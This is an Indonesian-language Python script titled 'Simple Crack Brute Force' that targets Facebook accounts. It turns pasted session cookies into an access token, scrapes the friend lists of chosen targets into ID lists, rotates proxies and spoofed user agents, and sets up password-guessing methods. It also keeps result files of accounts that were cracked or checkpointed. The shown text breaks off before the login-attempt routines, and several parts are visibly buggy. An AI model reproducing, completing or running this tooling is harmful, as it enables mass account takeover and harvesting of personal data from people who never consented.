def author(pm_aink):
	print(f'{K}[{P}•{K}]{P} Tunggu Sebentar Nanti Diarahin Ke WhatsApp ...')
	time.sleep(3)
	os.system("xdg-open https://wa.me/62895402690234")
	back()
#----------[ IMPORT-MODULE ]----------#
import re,os,sys,rich,bs4,time, json,urllib3,base64,random,datetime,requests
from bs4 import BeautifulSoup as sop
from rich.console import Console as sol
from rich import print as prints
from rich.console import Console
from concurrent.futures import ThreadPoolExecutor as tred
from rich import pretty
from rich.tree import Tree
from rich.table import Table
from rich.text import Text as tekz
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark

#----------[ GLOBAL-NAME ]----------#
pretty.install()
id2,uid=[],[]
proxxy,ugen=[],[]
dump,id,akun=[],[],[]
method,tokenku=[],[]
pwpluss,pwnya=[],[]
loop,ok,cp=0,0,0
CON=sol()
console=Console()
ses=requests.Session()
ualu =[]
ualuh = []
#----------[ GET-PROXY ]----------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(proxy)
except Exception as e:
    proxy=open('.prox.txt','r').read().splitlines()
    
#----------[ USER-AGENT ]----------#
ugen=[]
for xd in range(100000):
    rr = random.randint
    uaapi = random.choice
    device_xiaomi = random.choice(["Realme 5 Series","Realme V20","REALME RMX1911","Realme GT Neo","Realme V15","Realme Q2 Pro","realme  GT Neo3","Realme 8 5G","OPPO Reno4","OPPO A1 Pro","vivo Y31s"])
    model1 = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820"])
    versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    model = random.choice(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979"])
    xxxxx = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
    vivo = random.choice(['SM-G850F','SM-G850FQ','SM-G850Y','SM-G850M','SM-G850T','SM-G850A','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','SM-J415GN','SM-J415N','SAMSUNG SM-T530','SAMSUNG SM-T530','SAMSUNG SM-T805','SAMSUNG-SM-G530AZ','SAMSUNG SM-G925K','SAMSUNG SM-G925L','SAMSUNG SM-G925T','SAMSUNG-SM-T337A','SAMSUNG SM-J110F','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','SM-G850S','SM-G850L','SM-G850K','SM-E025F','SM-J415F','SM-J415FN','SM-J415G','SAMSUNG-SM-G890A','SAMSUNG SM-T355Y','SAMSUNG SM-T817T','SAMSUNG SM-G925F','SAMSUNG SM-G928F','SAMSUNG SM-W2021)','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','SAMSUNG SM-G996B','GT-S7500L','GT-S7500T'])
    build = f"{random.choice(xxxxx)}{random.choice(xxxxx)}{random.choice(xxxxx)}{random.randint(10,90)}{random.choice(xxxxx)}.{random.randint(100000,900000)}.{random.randint(100,300)}"
    yan1 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; vivo 010s) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/es_LA;FBAV/348.0.0.8.103;]"
    yan2 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;]"
    yan3 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; RMX9103) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/352.0.0.14.108;]"
    yan4 = f"Mozilla/115.0 (Windows NT 6.1) {str(rr(6,12))}; AppleWebKit/1537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Safari/1537.36"
    yan5 = f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko){versi_chrome} CriOS/116.0.5845.103 Mobile/15E148 Safari/604.1"
    yan6 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; ASUS_I005D Build/RKQ1.201022.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]"
    yan7 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Cool Browser/{versi_chrome} Mobile Safari/533.1"
    yan8 = f"Mozilla/5.0 (Linux; U; Android 11; itel A509WM Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 OPR/71.0.2254.67050"
    yan9 = f"Mozilla/5.0 (Linux; Android {str(rr(6,12))}; Pixel 7 XL) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{versi_chrome} Mobile Mobile Safari/537.36"
    uaapi = random.choice([yan1,yan2,yan3,yan4,yan5,yan6,yan7,yan8,yan9])    
    ugen.append(uaapi) 
#--------[ GENERATE-USER-AGENT ]----------#
for eksdi in range(10):
	a=random.choice(['7','8','9','10','11','12','13'])
	b=random.choice(['7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

#----------[ WARNA-TEMA ]----------#
puti = '\x1b[1;97m'# WARNA-PUTIH
mer = '\x1b[1;91m' # WARNA-MERAH
kun = '\x1b[1;93m' # WARNA-KUJING
hijo = '\x1b[1;92m' # WARNA-HIJAU
ung = '\x1b[1;95m' # WARNA-UNGU
biru = '\x1b[1;94m' # WARNA-BIRU
x = '\33[m' # DEFAULT
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m' 
bv = '\33[0;36m'
m = '\x1b[1;91m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
#----------[ CONVERTER-BULAN ]----------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#----------[ GARIS-KERAS ]----------#
def kopi():
	print(f"{hijo}_______________________________")
#----------[ KESALAHAN ]----------#	       
def help():
	krek_cer(f"\x1b[1;93m\x1b[1;97m[\x1b[1;91m•\x1b[1;97m] pilih yg bener bro :-(")
	login() 

#----------[ MACHINE-SUPPORT ]----------#		
def krek_cer(berjalan):
        for krek_cer in berjalan + "\n":sys.stdout.write(krek_cer);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
#----------[ BANNER ]----------#	
#----------[ BANNER ]----------#	
def banner():
	clear()
	krek_cer(f'''{hijo}Simple Crack Brute Force''')
#----------[ NGECEK COOKIES ]----------#
def login():
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
		tokenku.append(token)
		try:
			gass = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			krek = json.loads(gass.text)['id']
			fesbuk = json.loads(gass.text)['name']
			menu(krek,fesbuk)
		except KeyError:
			login_lagi()
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Koneksi Anda Bermasalah :-( ');exit()
	except IOError:
		login_lagi()
		
#----------[ LOGIN-COOKIES ]----------#		
def login_lagi():
	try:
		os.system('clear');banner()
		your_cookies = input(f'{kun}{x}[{hijo}•{x}] Masukan Cookies {hijo}: ')
		with requests.Session() as r:
			try:
				r.headers.update({
				'content-type': 'application/x-www-form-urlencoded',
				})
				data = {
				'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01',
				'scope': ''}
				response = json.loads(r.post(
				'https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = (
				'https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
				})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					krek_cer(f"{kun}{x}[{mer}•{x}]{mer} Cookies Anda Invalid :-(", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search(
					'name="fb_dtsg" value="(.*?)"', 
					str(response2)).group(1)
					jazoest = re.search(
					'name="jazoest" value="(\d+)"', 
					str(response2)).group(1)
					data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'qr': 0,'user_code': user_code,}
					r.headers.update({
					'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
					})
					response3 = r.post(
					'https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop(
						'content-type');r.headers.pop(
						'origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search(
						'action="(.*?)"', 
						str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search(
						'name="fb_dtsg" value="(.*?)"', 
						str(response4)).group(1)
						jazoest = re.search(
						'name="jazoest" value="(\d+)"', 
						str(response4)).group(1)
						scope = re.search(
						'name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search(
						'name="display" value="(.*?)"', 
						str(response4)).group(1)
						user_code = re.search(
						'name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search(
						'name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search(
						'name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search(
						'name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search(
						'name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({
						'origin': 'https://m.facebook.com','referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
						})
						data = {
						'fb_dtsg': fb_dtsg,
						'jazoest': jazoest,
						'scope': scope,
						'display': display,
						'user_code': user_code,
						'logger_id': logger_id,
						'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,
						'return_format[]': return_format,}
						response5 = r.post(
						'https://m.facebook.com{}'.format(action), data = data, cookies = {
						'cookie': your_cookies}).text
						windows_referer = re.search(
						'window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop(
						'content-type');r.headers.pop('origin')
						r.headers.update({
						'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
							})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"{kun}{x}[{hijo}•{x}] Token {hijo}: {access_token}")
							tokenew = open(".PotraitXDtoken.txt","w").write(access_token)
							cook= open(".PotraitXDcokies.txt","w").write(your_cookies)
							print(f"{kun}{x}[{hijo}•{x}] Login Berhasil Jalankan Ulang Python Run.py");exit()
			except Exception as e:
				krek_cer(f"{kun}{x}[{mer}•{x}]{mer} Login gagal cek tumbal lo ngab :-(")
				os.system('rm -rf .PotraitXDcokies.txt && rm -rf .PotraitXDtoken.txt');print(e);time.sleep(3)
				back()
	except:pass
	
#----------[ BAGIAN-MENU ]----------#
def menu(id,name):
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
	except IOError:
		print('[•] Cookies Kadaluarsa ')
		time.sleep(2)
		login_lagi()
	os.system('clear')
	banner()
	kopi()
	print('')
	krek_cer(f'{kun}{x}[{hijo}01{x}] Crack Publik          {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}02{x}] Crack Publik Masall   {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}03{x}] Crack File.           {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}04{x}] Cek Result            {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{hijo}05{x}] Lapor Bug Sc Error    {x}[{hijo}ON{x}]')
	krek_cer(f'{kun}{x}[{mer}00{x}] Hapus Cookies         {x}[{hijo}ON{x}]')
	_Gass_nge_krek_ = input(f'{kun}{x}[{hijo}•{x}] Input : ')
	kopi()
	print('')
	if _Gass_nge_krek_ in ['1','01']:
		crack_publik()
	elif _Gass_nge_krek_ in ['2','02']:
		krek_publik()
	elif _Gass_nge_krek_ in ['3','03']:
		file_dump()
	elif _Gass_nge_krek_ in ['4','04']:
		cek_result()
	elif _Gass_nge_krek_ in ['5','05']: 
		author('pm_aink')
	elif _Gass_nge_krek_ in ['0','00']:
		os.system('rm -rf .PotraitXDcokies.txt && rm -rf .PotraitXDtoken.txt')
		krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Suckses hapus cookies');exit()
	else:
		help()

#----------[ CRACK-PUBLIK ]----------#
def krek_publik():
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{kun}{x}[{hijo}•{x}] Berapa Target : '))
	except ValueError:
		help()
	if jum<1 or jum>100:
	    krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Gagal Dump Idz ');back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f"{kun}{x}[{hijo}•{x}] Idz Target Ke "+str(yz)+f"{hijo} : ")
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Cek Sinyal Lo Ngab :-(')
	try:
		print(f'{kun}{x}[{hijo}•{x}] Total Idz Target {hijo}'+str(len(id)))
		kopi()
		print('')
		atur_ter()
	except requests.exceptions.ConnectionError:
		krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Cek Sinyal Lo Ngab :-(')
	except (KeyError,IOError):
		krek_cer(f'{kun}{x}[{mer}•{x}]{mer} Pertemanan Tidak Publik ');time.sleep(2);back()
#PUBLIK KREK#
def crack_publik():
	try:
		token = open('.PotraitXDtoken.txt','r').read()
		cok = open('.PotraitXDcokies.txt','r').read()
	except IOError:
		exit() 
	aink_gabut = input(f'{x}[{H}•{x}]{x} Target : ')
	try:
		aink_raka = ses.get('https://graph.facebook.com/v2.0/'+aink_gabut+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
		for ricode_bang in aink_raka['friends']['data']:
			try:id.append(ricode_bang['id']+'|'+ricode_bang['name'])
			except:continue
		krek_cer(f'{kun}{x}[{hijo}•{x}] Total  : '+str(len(id)))
		kopi()
		print('')
		atur_ter()
	except requests.exceptions.ConnectionError:
		krek_cer(f'{K}[{P}•{K}]{P} Koneksi Internet Bermasalah')
	except (KeyError,IOError):
		krek_cer(f'{K}[{P}•{K}]{P} Pertemanan Tidak Publik ')
		back()
###----------[ CRACK  FILE ]----------###
def file_dump():
	mz = 0
	bzz = {}
	try:baz_gtg = os.listdir('/sdcard/DUMP/')
	except FileNotFoundError:
		print('{kun}{x}[{hijo}•{x} file dump tidak ada ster ')
		print('{kun}{x}[{hijo}•{x} buat file terlebih dahulu ')
		time.sleep(2)
		back()
	if len(baz_gtg)==0:
		print('{kun}{x}[{hijo}•{x}] file dump tidak ada ster ')
		print('{kun}{x}[{hijo}•{x} buat file terlebih dahulu ')
		time.sleep(2)
		back()
	else:
		for file_id in baz_gtg:
			try:pen_file = open('/sdcard/DUMP/'+file_id,'r').readlines()
			except:continue
			mz+=1
			if mz<100:
				jumh = ''+str(mz)
				bzz.update({str(mz):str(file_id)})
				bzz.update({jumh:str(file_id)})
				print(f'[•] %s. %s ({hijo} %s{x} )'%(jumh,file_id,len(pen_file)))
			else:
				bzz.update({str(mz):str(file_id)})
				print('['+str(mz)+'] '+file_id+' [ '+str(len(pen_file))+' akun ]'+x)
				print('[•] %s. %s ({hijo} %s {x}) '%(mz,file_id,len(pen_file)))
		_chos_baz = input(f'{x}[{H}•{x}]{x} Input : ')
		kopi()
		print()
		try:gaz_sung = bzz[_chos_baz]
		except KeyError:
			print(f'[•] yang bener milihnya {x}')
			time.sleep(2)
			file_dump()
		try:cekz_ = open('/sdcard/DUMP/'+gaz_sung,'r').read().splitlines()
		except:
			print('{x}[•]filenya tidak ada ')
			waktu(2)
			back()
		for idnyh in cekz_:
			id.append(idnyh)
		atur_ter()
#----------[ CEK-RESULT ]----------#
def cek_result():
	print(f'{kun}{x}[{hijo}•{x}] Hasil OK ')
	print(f'{kun}{x}[{hijo}•{x}] Hasil CP ')
	kz = input(f'{kun}{x}[{hijo}•{x}] Input : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}{x}[{mer}•{x}] Anda tidak memiliki hasil Cp ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{kun}{x} %s. %s ({kun} %s {x}Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'{kun}{x}[{hijo}•{x}] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				help()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{kun} {kun}{cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			input(f'{kun} [{hijo} Klik Enter {kun}]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
		if len(vin)==0:
			print(f'{kun}{x}[{mer}•{x}] Anda tidak memiliki hasil Ok ');time.sleep(2);back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{kun}{x} %s. %s ( {hijo}%s{x} Idz )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{kun}{x} %s. %s ({hijo} %s {x}Idz )'%(cih,isi,(len(hem))))
			geeh = input(f'{kun}{x}[{hijo}•{x}] Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				help()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				krek_cer(f'{kun}{x}[{mer}•{x}] File tidak di temukan ');time.sleep(2);back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{kun} {hijo}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				nocp +=1
			input(f'{kun} {x}[{hijo} Klik Enter {x}]')
			back()
	elif kz in ['3']:
		back()
	else:
		help()								
#----------[ MENU-METODE ]----------#
def atur_ter():
	for cape_euy in id:
		id2.insert(0,cape_euy)
	krek_cer(f'{K}[{P}01.{K}]{P} Method Validate')
	krek_cer(f'{K}[{P}02.{K}]{P} Method Async')
	krek_cer(f'{K}[{P}03.{K}]{P} Method Reguler') 
	krek_cer(f'{K}[{P}04.{K}]{P} Method New ')
	krek_cer(f'{K}[{P}05.{K}]{P} Method New v1 ')
	Url_nge_krek = input(f'{K}[{P}•{K}]{P} Select Method  : {K}')
	kopi()
	print()
	if Url_nge_krek in ['1','01']:
		method.append('mobile')
	elif Url_nge_krek in ['2','02']:
		method.append('mbasic')
	elif Url_nge_krek in ['3','03']:
		method.append('asyinc')
	elif Url_nge_krek in ['4','04']:
		method.append('mbeta')
	elif Url_nge_krek in ['5','05']:
		method.append('free')
	else:
		method.append('mobile')
	pwplus=input(f"{x}[{hijo}•{x}]{x} Tambahkan Password Manual y/t : ") 
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f"{x}[{hijo}•{x}]{x} Input Password : ")
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	uatambah = input(f"{x}[{hijo}•{x}]{x} Tambahkan Usr Agent Manual y/t : ") 
	if uatambah in ['y','Ya','ya','Y']:
		ualuh.append('ya')
		bzer = input(f"{x}[{hijo}•{x}]{x} Input User Agent :  ") 
